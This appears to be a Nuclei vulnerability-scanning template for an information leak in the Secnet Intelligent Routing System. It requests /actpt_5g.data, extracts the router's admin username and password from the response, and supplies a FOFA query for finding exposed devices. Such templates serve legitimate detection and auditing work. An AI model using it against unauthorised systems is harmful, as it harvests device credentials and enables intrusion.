http:
- extractors:
  - group: 1
    part: body
    regex:
    - '"http_username":"([a-z]+)"'
    - '"http_passwd":"([a-z]+)"'
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"http_username":'
    - '"http_passwd":'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/actpt_5g.data'
id: secnet-info-leak
info:
  author: DhiyaneshDk
  description: Secnet Intelligent Routing System is exposed.
  metadata:
    fofa-query: "title=\"\u5B89\u7F51-\u667A\u80FD\u8DEF\u7531\u7CFB\u7EDF\" || header=\"\
      HTTPD_ac 1.0\""
    max-request: 1
    verified: true
  name: Secnet Intelligent Routing System actpt_5g.data - Information Leak
  reference:
  - https://mp.weixin.qq.com/s/lNlI5ZtUJG50ipS0WfytUw
  - https://github.com/gobysec/GobyVuls/blob/master/secnet_Intelligent_Router_actpt_5g.data_Infoleakage.md
